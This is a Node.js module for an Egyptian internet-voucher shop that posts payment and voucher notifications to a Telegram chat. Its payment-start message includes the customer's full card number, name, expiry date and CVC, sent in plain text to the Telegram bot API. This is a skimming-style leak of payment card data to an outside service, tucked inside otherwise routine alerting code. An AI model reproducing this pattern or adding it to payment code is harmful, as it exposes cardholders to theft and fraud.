const axios = require("axios");
const FormData = require("form-data");

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

/**
 * دالة استخراج وتنسيق وسيلة الدفع بشكل واضح
 */
function getPaymentMethodName(data) {
  let method = data.payment_method || data.source_type || "محفظة إلكترونية";
  if (method === "card") method = "بطاقة بنكية (Visa / Mastercard)";
  else if (method === "wallet") method = "محفظة إلكترونية (Mobile Wallet)";
  else if (method === "valu") method = "برنامج تقسيط (Valu)";
  else if (method === "seven") method = "برنامج تقسيط (SEVEN)";
  else if (method === "aman") method = "أمان / مصاري (Aman)";
  return method;
}

/**
 * دالة تنسيق التاريخ والوقت بتوقيت مصر
 */
function getFormattedDateTime() {
  const now = new Date();
  const formattedDate = now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" });
  const formattedTime = now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" });
  return `${formattedDate} - ${formattedTime}`;
}

/**
 * إرسال رسالة نصية عامة إلى التليجرام (حالة الجاري وحالة النجاح)
 * @param {Object} data - بيانات العملية
 * @param {boolean} isInitial - true عند بدء عملية الدفع، false عند التأكيد والنجاح
 */
async function sendTelegramMessage(data, isInitial = true) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    const method = getPaymentMethodName(data);
    const amountEGP = data.amount_cents ? (data.amount_cents / 100).toFixed(2) : (data.amount || "غير محدد");
    const dateTimeStr = getFormattedDateTime();

    let message = "";

    if (isInitial) {
      // 1. الرسالة الأولى: جاري عملية الدفع
      message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;

      if (data.phone && data.phone !== "غير محدد") {
        message += `📱 رقم المحفظة / الهاتف: <code>${data.phone}</code>\n`;
      }

      // إرفاق بيانات البطاقة الكاملة إن وجدت (فيزا)
      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
        message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
                  `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
                  `👤 اسم صاحب البطاقة: <b>${data.card_data.name}</b>\n` +
                  `📅 تاريخ الانتهاء: <code>${data.card_data.expiry}</code>\n` +
                  `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
      }

      message += `\n🕒 الوقت: <code>${dateTimeStr}</code>`;

    } else {
      // 2. الرسالة الثانية: تأكيد نجاح الدفع والتفعيل
      const txnId = data.id || data.transactionId || data.order?.id || "غير متوفر";
      const voucher = data.voucher_code || (data.card ? data.card.code : "غير متوفر");
      const packageInfo = data.package_info || data.packageName || "باقة إنترنت شبكة حكايات";
      const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";

      message = `✅ <b>تم عملية الدفع بنجاح!</b>\n\n` +
                `🆔 رقم العملية: <code>${txnId}</code>\n` +
                `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
                `📦 البروفايل / الباقة: <b>${packageInfo}</b>\n` +
                `🎟️ رقم الكارت (Voucher): <code>${voucher}</code>\n` +
                `📅 تاريخ ووقت العملية: <code>${dateTimeStr}</code>`;
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error("❌ خطأ في إرسال رسالة تليجرام:", err.response?.data || err.message);
  }
}

/**
 * إرسال صورة كارت الإنترنت المصممة مع التفاصيل والتنبيه بنفاذ المخزون
 * @param {Object} voucherInfo - بيانات الكارت والباقة
 * @param {Buffer} imageBuffer - Buffer يحتوي على صورة الكارت المصممة من canvas
 */
async function sendVoucherWithCardImage(voucherInfo, imageBuffer) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    const { amount, packageName, card, remaining, phone, transactionId } = voucherInfo;
    const dateTimeStr = getFormattedDateTime();

    // 1. إرسال صورة الكارت المولد
    if (imageBuffer && card) {
      const captionText = `🎉 <b>تم دفع وتأكيد كارت الإنترنت بنجاح!</b>\n\n` +
                          `🌐 <b>شبكة حكايات نت</b>\n` +
                          `🆔 رقم المعاملة: <code>${transactionId}</code>\n` +
                          `📱 رقم الهاتف: <code>${phone}</code>\n` +
                          `📦 الباقة: <b>${packageName}</b> (${amount} ج.م)\n` +
                          `🎟️ رقم الكارت: <code>${card.code}</code>\n\n` +
                          `🕒 الوقت: <code>${dateTimeStr}</code>`;

      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("photo", imageBuffer, { filename: `hikayat_card_${card.code}.png`, contentType: "image/png" });
      form.append("caption", captionText);
      form.append("parse_mode", "HTML");

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
        headers: form.getHeaders()
      });
    }

    // 2. إرسال تنبيه في حالة قرب نفاذ الكروت (آخر 5 كروت أو أقل)
    if (typeof remaining === "number" && remaining <= 5) {
      let warningMessage = `🚨 <b>تنبيه مخزون الكروت - شبكة حكايات!</b>\n\n` +
                            `📦 الباقة: <b>${packageName}</b> (${amount} ج.م)\n`;

      if (remaining > 0) {
        warningMessage += `⚠️ المتبقي في المخزون حالياً: <b>${remaining} كارت</b> فقط!\nيرجى إضافة كروت جديدة في أقرب وقت.`;
      } else {
        warningMessage += `❌ <b>نفدت جميع كروت هذه الباقة بالكامل!</b>\nلن يستطيع العملاء الشراء حتى إضافة كروت جديدة.`;
      }

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: warningMessage,
        parse_mode: "HTML"
      });
    }

  } catch (err) {
    console.error("❌ خطأ أثناء إرسال صورة الكارت أو التنبيه للتليجرام:", err.response?.data || err.message);
  }
}

module.exports = {
  sendTelegramMessage,
  sendVoucherWithCardImage
};
